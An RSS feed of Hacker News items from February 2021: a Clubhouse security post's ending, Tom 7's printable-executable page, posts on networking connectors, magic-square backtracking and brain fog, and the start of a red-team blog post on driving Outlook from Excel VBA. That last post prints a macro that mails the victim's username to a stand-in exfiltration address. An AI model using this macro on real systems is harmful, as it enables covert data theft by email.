<source src="https://d33wubrfki0l68.cloudfront.net/d1a1a4f527e5dcadbcfb23bc8a5da657f7d0a050/ca095/m/clubhouse-fun/remove-from-room.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/de80647f96c9a6a6baee1ef4bee4fc10f99076a2/0ca56/m/clubhouse-fun/remove-from-room.webm" type="video/webm"></video><h2 id="-next-week-on-zerforschung">… next week on zerforschung</h2><p>We will publish an article with all technical details as well as the tools we built in the course of the tests.
But first we want to give Clubhouse enough time to fix the described problems.</p><p>We have informed Clubhouse about the problems but have not received any feedback at the time of publication.</p><p>However: We have decided to publish this article anyway before fixing the problems, because in our view these problems are unfortunately (too) easy to find and can cause some damage if not known.</p><p>However, after a quick skim of the Agora interface documentation and Clubhouse’s use of it so far, we estimate that fixing the problem might be a bit more difficult after all.
But the details and a few fun things we found will follow soon, so stay tuned 🚀✨</p><div><p>All our work is done in our spare time, besides our jobs and general pandemic exhaustion.
If you like what we do and want to support us so we can do more nonsense like this or something else, you can check out our <a href="https://zerforschung.org/unterstuetzen/">support page</a>.</p><p>To stay up to date, follow us on <a href="https://twitter.com/zerforschung">Twitter</a> or subscribe to our <a href="https://zerforschung.org/index.xml">RSS feed</a></p></div><p>Audio in the sample videos: Kmart Radio Jingle &amp; Kmart Gift Certificates Announcement from <a href="https://archive.org/details/KmartDecember1992">https://archive.org/details/KmartDecember1992</a></p></div></div>]]>
            </description>
            <link>https://zerforschung.org/posts/clubhouse-endless-audio-fun-en</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127200</guid>
            <pubDate>Sat, 13 Feb 2021 21:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C compiler for producing completely printable DOS executables]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26127161">thread link</a>) | @jstrieb
<br/>
February 13, 2021 | http://tom7.org/abc/ | <a href="https://web.archive.org/web/*/http://tom7.org/abc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>
ZM~~&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PRinty#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;with&nbsp;ABC!
</p>

<p>Hi! For <a href="http://sigbovik.org/2016/">SIGBOVIK 2017</a>, I created a strange <a href="http://tom7.org/abc/paper.pdf">paper</a>. This one may be a bit impenetrable for non computer scientists. If you have the time, I think reading the paper is the best way to experience it. But I also created the following video that explains the ideas involved, for interested non-experts or patient experts. It's long, at about 25 minutes, but you can always just skip to the end:

<iframe width="853" height="480" src="https://www.youtube.com/embed/LA_DrBwkiJA" frameborder="0" allowfullscreen=""></iframe>

</p><p>The paper in raw form is available as <a href="http://tom7.org/abc/paper.exe">PAPER.EXE</a> or <a href="http://tom7.org/abc/paper.txt">PAPER.TXT</a> (same file). Due to unreasonable SIGBOVIK deadlines, it's been updated a little compared to the version that appeared in SIGBOVIK 2017 (<a href="http://tom7.org/abc/abc.bib">bibtex</a>).

</p><p>The source code I used to create the paper is <a href="http://sourceforge.net/p/tom7misc/svn/HEAD/tree/trunk/abc/">here</a>.</p>

<p>Please leave a comment <a href="http://radar.spacebar.org/">on my blog</a> or on Twitter at <a href="http://twitter.com/tom7">@tom7</a>!
</p><p>Get all Tom 7 thingos at → [<a href="http://tom7.org/">tom7.org</a>]</p>

</div></div></div>]]>
            </description>
            <link>http://tom7.org/abc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127161</guid>
            <pubDate>Sat, 13 Feb 2021 21:34:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Bestsnip – Draw animations online with automatic inbetweening]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26126906">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://bestsnip.com/animation/ | <a href="https://web.archive.org/web/*/https://bestsnip.com/animation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://bestsnip.com/animation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126906</guid>
            <pubDate>Sat, 13 Feb 2021 21:05:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Display Connectors in Networking Equipment]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126825">thread link</a>) | @todsacerdoti
<br/>
February 13, 2021 | https://eloydegen.com/blog/posts/display-connectors-networking-equipment/ | <a href="https://web.archive.org/web/*/https://eloydegen.com/blog/posts/display-connectors-networking-equipment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>It seems that networking equipment vendors have some tradition of using display connectors for other purposes.</p>
<p>HP, <a href="https://jackstromberg.com/2013/01/stacking-with-the-dell-powerconnect-5548s/">Dell</a> and Netgear use HDMI cables for stacking networking switches. According to <a href="https://serverfault.com/questions/408925/stacking-two-netgear-gs748ts-switches-via-hdmi-only-1gbps-trunk-bandwidth">this</a> Serverfault answer, a HDMI 1.3 or 1.4 compliant cable is needed for achieving the near 10Gbit theoretical throughput on Netgear hardware. The HDMI spec has specified the <a href="https://en.wikipedia.org/wiki/HDMI#HEC">HDMI Ethernet Channel (HEC)</a>, but that is only 100BASE-T, so these vendors have made a different implementation.</p>
<p>Cisco is known to use the <a href="https://en.wikipedia.org/wiki/Low-force_helix">60-pin low-force helix</a> connector for their legacy <a href="https://www.cisco.com/c/en/us/support/docs/interfaces-modules/1700-2600-3600-3700-1-port-serial-wan-interface-card/7265-hw-1t-wic.html">Serial WAN Interface Card (WIC-T1)</a>. It is typically used as a display connector on workstations, because it enables connecting up to 4 displays through a single connector.</p>
<p><img src="https://eloydegen.com/blog/images/cisco_lfh.jpg" alt="Connector"></p>
<p>3Com used the <a href="https://en.wikipedia.org/wiki/DB13W3">DB13W3</a> with the Dual Speed Hub 500 for a redundant DC power supply connection. Even though the connector itself is slightly different because the pins in the large holes are missing, a standard DB13W3 cable seems to fit. I don’t have this hub so I haven’t tested it myself, but I would be suprised if it doesn’t fit. I hope nobody their office burned down because a DB13W3 intended for displays was used instead.</p>
<p><img src="https://eloydegen.com/blog/images/DB13W3_connector.jpg" alt="Connector"></p>
<p>The connector is specified further in the manual:</p>
<p><img src="https://eloydegen.com/blog/images/Number8.png" alt="Number 8 description"></p>
<h2 id="legality">Legality</h2>
<p>If there isn’t a patent or copyright on the design of the connector and the official logo or name is not used, then I think it’s legal, but this does not seem to be the case with HDMI®.</p>
<p>The official Dell manual is calling it “HDMI Ports”, but those ports are certainly not implementing the HDMI protocol. I wonder if any lawyers would argue that this is a trademark infringement.</p>
<p><img src="https://eloydegen.com/blog/images/hdmi_dell.png" alt="Dell manual with HDMI cables"></p>
</article>

        </div></div>]]>
            </description>
            <link>https://eloydegen.com/blog/posts/display-connectors-networking-equipment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126825</guid>
            <pubDate>Sat, 13 Feb 2021 20:57:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving Magic Squares Using Backtracking]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26126652">thread link</a>) | @jpskycak
<br/>
February 13, 2021 | http://www.eurisko.us/solving-magic-squares-using-backtracking/ | <a href="https://web.archive.org/web/*/http://www.eurisko.us/solving-magic-squares-using-backtracking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><!--<p class="page__meta"><i class="fa fa-clock-o" aria-hidden="true"></i> 12 minute read</p>--> <!--<p class="page__meta"><time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--><p>By <a target="_blank" href="https://eurisko-us.github.io/elijah-tarr">Elijah Tarr</a> on <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p><!--<p class="page__date"><strong><i class="fa fa-fw fa-calendar" aria-hidden="true"></i> Published:</strong> <time datetime="2020-12-21T00:00:00-08:00">December 21, 2020</time></p>--></header><section itemprop="text"><div><p>A magic square can be thought of as a matrix with specific rows, columns, and diagonals adding up to the same number, called the magic constant. For an $n \times n$ magic square, the magic constant is</p><center> $\begin{align*} \dfrac{1}{n} \sum_{k=1}^{n^2} k \end{align*}$ </center><p>For example, a magic square with dimensions $3 \times 3$ would have magic constant $15,$ and dimensions $4 \times 4$ would have magic constant $34.$</p><p>To solve a magic square, we must fill in each element with a number in ${1, 2, \ldots, n^2 },$ and each number must appear exactly once. A $3 \times 3$ magic square could look like this:</p><center> $\begin{align*} \begin{bmatrix} 2 &amp; 7 &amp; 6 \\ 9 &amp; 5 &amp; 1 \\ 4 &amp; 3 &amp; 8 \end{bmatrix} \end{align*}$ </center><p>Or this:</p><center> $\begin{align*} \begin{bmatrix} 8 &amp; 3 &amp; 4 \\ 1 &amp; 5 &amp; 9 \\ 6 &amp; 7 &amp; 2 \end{bmatrix} \end{align*}$ </center><p>It may seem like a $3 \times 3$ magic square can have multiple solutions. But looking closer allows us to see that the two matrices above are actually both the same configuration. The second matrix is just the first matrix rotated $180$ degrees. In general, rotating and flipping a magic square in any direction will still yield a valid magic square.</p><h2>Solving a Magic Square Using Brute Force</h2><p>How can we build a program to construct one of these magic squares?</p><p>Just like every problem, the simplest way to solve a magic square is to use brute force. It will be the most inefficient solution we can think of, but it will give us some grounding to see which areas we need to improve it in. To get some code down, we can write something like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>():
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>The classic $9$-nested-for-loop approach. It is quite inefficient, but it will do the job. Each $x_k$ variable represents a space in the square. There are 9 spaces, so we nest $9$ loops, $1$ for each space. Each loop will loop through all the possible numbers in that space, $1$ through $9.$</p><p>To write the <code>is_valid</code> function, we need to check for duplicate values, which can easily be done with the use of a set. Then we have to check if each row, column, and diagonal adds up to a certain number, so we can just make a list of all those and check if they are equal to $15$ at the end.</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>is_valid</span>(square, n):
    vals <span>=</span> [entry <span>for</span> row <span>in</span> square <span>for</span> entry <span>in</span> row <span>if</span> entry <span>!=</span> <span>None</span>]
    <span>if</span> <span>len</span>(<span>set</span>(vals)) <span>&lt;</span> <span>len</span>(vals): <span># check for duplicates</span>
        <span>return</span> <span>False</span>
        
    num_rows <span>=</span> <span>len</span>(square)
    arrs <span>=</span> square \ <span># rows</span>
        <span>+</span> [<span>list</span>(arr) <span>for</span> arr <span>in</span> <span>zip</span>(<span>*</span>square)] \ <span># columns</span>
        <span>+</span> [square[i][i] <span>for</span> i <span>in</span> <span>range</span>(<span>len</span>(square))] <span># main diagonal</span>
        <span>+</span> [square[i][num_rows<span>-</span>i<span>-</span><span>1</span>] <span>for</span> i <span>in</span> <span>range</span>(num_rows)] <span># anti-diagonal</span>
        
    <span>return</span> <span>all</span>(<span>sum</span>(arr) <span>==</span> n <span>for</span> arr <span>in</span> arrs <span>if</span> <span>None</span> <span>not</span> <span>in</span> r)
</pre></div></span></p><p>Because I want this function to be able to run on squares larger than just $3 \times 3,$ I pass in the constant as $n$. For a $3 \times 3$ square, we would set $n=15.$ For a $4 \times 4$ square, we would set $n=34.$</p><h2>Brute Force Takes Forever!</h2><p>Let’s talk about timing. We have $9$ nested for loops, and the <code>is_valid</code> operation is in the deepest one. Since each loop is going to run $9$ times to test each number $1-9$ in each element of the square, it’s going to run the <code>is_valid</code> function $9^9$ times, which is absolutely insane.</p><p>Using Python’s <code>timeit</code> module, we can see how long the <code>is_valid</code> function takes to run:</p><ul><li>$1.6 \, \mu\textrm{s}$ to run if there are duplicate values</li><li>$5.3 \, \mu\textrm{s}$ to run if there are no duplicate values</li><li>$6.3 \, \mu\textrm{s}$ to run if the square is valid</li></ul><p>With this brute force algorithm, we can expect that the vast majority of iterations are going to have duplicate values in them. So, I’ll be generous and say that each time it runs, $1.6 \, \mu\textrm{s}$ pass. That means the amount of time it takes is $9^9 \times 1.6 \textrm{ usecs} \sim 10.3 \textrm{ minutes}.$</p><p>What if we wanted a $4 \times 4$ magic square? Well, we can use the equation again: $16^{16} \times 1.6 \mu\textrm{s} \sim \textbf{600 millennia}.$ It’s very unlikely that the human race will even exist for that long; we might have destroyed the earth along with the computer that was running this algorithm by then. We need to write a more efficient algorithm.</p><h2>Backtracking</h2><p>The problem with brute force is that it spends too much time looking through solutions that will never work. For example, the algorithm starts out with the square</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 1 \end{bmatrix}, \end{align*}$ </center><p>and then advances to</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 2 \end{bmatrix}, \end{align*}$ </center><p>and then</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 1 &amp; 1\\ 1 &amp; 1 &amp; 1 \\ 1 &amp; 1 &amp; 3 \end{bmatrix}. \end{align*}$ </center><p>There’s absolutely no point in checking any square with the first $3$ numbers as $1$ because we’re not allowed to have duplicates.</p><p>To avoid configurations like $1,1,1$ as the top row, we can use a technique called <b>backtracking</b>. Whenever we reach a configuration that won’t work, we “backtrack” and skip over that configuration instead of wasting tons of time modifying it in ways that will never make it valid.</p><p>Using backtracking, we would skip over all configurations that have duplicates, and instead start out with</p><center> $\begin{align*} \begin{bmatrix} 1 &amp; 2 &amp; 3\\ 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \end{bmatrix}. \end{align*}$ </center><p>To implement backtracking, we’ll start by skipping over configurations with duplicates. In each for loop, before entering the next loop, we will check if the number has been duplicated anywhere. We will only check the rest of the square if the number isn’t duplicated. Implementing this, we end up with the following code:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>()
    <span>for</span> x1 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
        <span>for</span> x2 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
            <span>if</span> x2 <span>in</span> [x1]:
                <span>continue</span>
            <span>for</span> x3 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                <span>if</span> x3 <span>in</span> [x1, x2]:
                    <span>continue</span>
                <span>for</span> x4 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                    <span>if</span> x4 <span>in</span> [x1, x2, x3]:
                        <span>continue</span>
                    <span>for</span> x5 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                        <span>if</span> x5 <span>in</span> [x1, x2, x3, x4]:
                            <span>continue</span>
                        <span>for</span> x6 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                            <span>if</span> x6 <span>in</span> [x1, x2, x3, x4, x5]:
                                <span>continue</span>
                            <span>for</span> x7 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                <span>if</span> x7 <span>in</span> [x1, x2, x3, x4, x5, x6]:
                                    <span>continue</span>
                                <span>for</span> x8 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                    <span>if</span> x8 <span>in</span> [x1, x2, x3, x4, x5, x6, x7]:
                                        <span>continue</span>
                                    <span>for</span> x9 <span>in</span> <span>range</span>(<span>1</span>, <span>10</span>):
                                        <span>if</span> x9 <span>in</span> [x1, x2, x3, x4, x5, x6, x7, x8]:
                                            <span>continue</span>
                                        square <span>=</span> [[x1, x2, x3],
                                                  [x4, x5, x6],
                                                  [x7, x8, x9]]
                                        <span>if</span> is_valid(square, <span>15</span>):
                                            <span>return</span> square
</pre></div></span></p><p>Once we run this code, we notice a massive improvement in performance! Within only a couple of seconds, our algorithm actually finds multiple squares.</p><p>With this new algorithm, we skip all squares which repeat numbers, which will always be invalid. So, we are looping through all permutations. We can expect to run the validation function about $P(10, 9) = 3,628,800$ times, which is much less than the $9^9$ times we had to check last time.</p><p>Now, this method speeds up our code, but by how much? Theoretically, it takes $P(10, 9) * 1.6 \mu\textrm{s} \sim 5.8 \mu\textrm{s}$ to just run all the validations. (We introduced a bunch of ‘if’ statements in between each of the for loops, so it will take a bit longer in reality.) But the point is, our new algorithm works $10,600\%$ faster than the old one!</p><h2>Using a While Loop</h2><p>Still, we have another problem left, and that is the quality of the code. No one wants to have to look at a cascading abyss of for loops and if statements while writing their code, so let’s see if we can combine all this into a single while loop.</p><p>If you think about it, we can treat the square as a list of numbers instead of a list of rows. Instead of $[[1, 2, 3], [4, 5, 6], [7, 8, 9]],$ we can store the array as $[1, 2, 3, 4, 5, 6, 7, 8, 9].$ Now, that means we will need a function to convert the flat list into a square:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>arr_to_square</span>(arr):
    side_length <span>=</span> <span>int</span>(<span>len</span>(arr) <span>**</span> <span>0.5</span>)
    <span>return</span> [arr[i:i<span>+</span>side_length] <span>for</span> i <span>in</span> <span>range</span>(<span>0</span>, <span>len</span>(arr), side_length)]
</pre></div></span></p><p>Now, let’s think of how we can structure the while loop. We want the loop to keep going until both the value None is nowhere to be found in the list, and the square is valid. We can use the <code>or</code> operator to run the loop if <code>None</code> is in the square, or the square isn’t valid, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>gen_magic_square</span>(size):
    n <span>=</span> get_magic_const(size)
    square <span>=</span> [<span>None</span> <span>for</span> i <span>in</span> <span>range</span>(size<span>**</span><span>2</span>)]
    
    <span>while</span> <span>None</span> <span>in</span> square <span>or</span> <span>not</span> is_valid(arr_to_square(square), n):
        <span>pass</span>
        
    <span>return</span> arr_to_square(square)
</pre></div></span></p><p>You’ll notice I use the function <code>get_magic_const</code>, which computes the magic constant, like this:</p><p><span size="3em"> <!-- HTML generated using hilite.me --><div><pre><span>def</span> <span>get_magic_const</span>(side_length):
    <span>return</span> side_length<span>*</span>(side_length<span>**</span><span>2</span><span>+</span><span>1</span>)<span>/</span><span>2</span>
</pre></div></span></p><p>We will need a variable to store the index of the …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eurisko.us/solving-magic-squares-using-backtracking/">http://www.eurisko.us/solving-magic-squares-using-backtracking/</a></em></p>]]>
            </description>
            <link>http://www.eurisko.us/solving-magic-squares-using-backtracking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126652</guid>
            <pubDate>Sat, 13 Feb 2021 20:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a “cloudy-headed” feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can’t concentrate, everything you do is harder and takes longer than you’d like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There’s a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn’t too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You’re not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you’re going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn’t&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you’re continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain – reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It’s one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you’re comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain’s regenerating capacity, known as plasticity.</p>
<p>“Neglect of intense learning leads plasticity systems to waste away,” says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>“It’s the willingness to leave the comfort zone that is the key to keeping the brain new,” he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don’t sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being “like a muscle”. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30–45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It’s extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go…</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, “<em>The Power of One Percent Better: Small Gains, Maximum Results”. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 175 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">“Hacking in a epistolary way”</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
